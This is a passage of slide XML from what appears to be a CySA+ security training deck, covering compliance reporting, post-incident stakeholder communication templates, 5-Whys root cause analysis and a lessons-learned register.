            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Periodic regulatory scans (PCI DSS 11.3.2 — ASV)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PCI DSS specifically requires:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 1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18" name="TextBox 1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9" name="TextBox 1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884</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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29 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Build a crosswalk that prevents duplicate control work across PCI/ISO/CSF/CIS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Index evidence per control with a unique ID and a hash.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Author a quarterly compliance report skeleton.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Recognise specific PCI DSS scanning obligations (internal vs ASV).</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885</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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30 — Stakeholder Communication and Lessons Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will draft the four canonical post-incident communications — executive, customer, regulator, public/media — and close the incident with a structured lessons learned and root cause analysis that feeds the next preparation cycle. This maps to CySA+ 4.2 (Communications — Legal, Public relations, Customer…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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886</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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30 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Identify every stakeholder for CASE-001</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Carry the CASE-001 scenario from Lab 27.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Executive briefing template</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Keep ≤ 1 screen.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>To: CEO, CFO, General Counsel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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240" y="3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Customer notification template (GDPR-style)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Plain language.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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452360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Subject: Important security notice about your data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Regulator notification (GDPR Art. 33 template)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Submit via the supervisory authority's web portal.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Notification of personal data breach — Art. 33 GDPR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Public / media holding statement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Keep ≤ 100 words.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>We recently identified a cybersecurity incident affecting a limited numb</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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887</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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30 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Law enforcement referral checklist</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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923794"/>
            <a:ext cx="91440" cy="101269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05840" y="3201543"/>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05840" y="3201543"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Root cause analysis — 5 Whys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This phrasing matters: blaming the user generates fear, not improvement.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3155823"/>
            <a:ext cx="3977639" cy="5486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52360" y="3155823"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>1. Why did the attacker exfiltrate 1 GB? → They had valid credential</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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240" y="4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Lessons learned register</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The output of this register is the input to next quarter's Preparation phase — closing the NIST loop one more time.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4296537"/>
            <a:ext cx="3977639" cy="5486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452360" y="4296537"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># Lessons Learned — CASE-001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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005840" y="5482971"/>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05840" y="5482971"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Stakeholder map → CySA+ 4.2 final crosswalk</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888</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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30 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identify every stakeholder for a sev-1 incident and pick the right channel for each.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Draft executive, customer, regulator, and media communications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Run a 5-Whys RCA that targets process, not people.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Close the incident with a structured Lessons Learned register that feeds back into the IR life cycle.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889</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 RECAP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Recap — Reporting and Communication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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerability management reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Executive incident reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security metrics (MTTD/MTTR)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compliance reporting (PCI DSS / ISO 27001 / NIST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stakeholder communication &amp; lessons learned</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890</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM</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Test Yourself Before the Real Exam</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891</a:t>
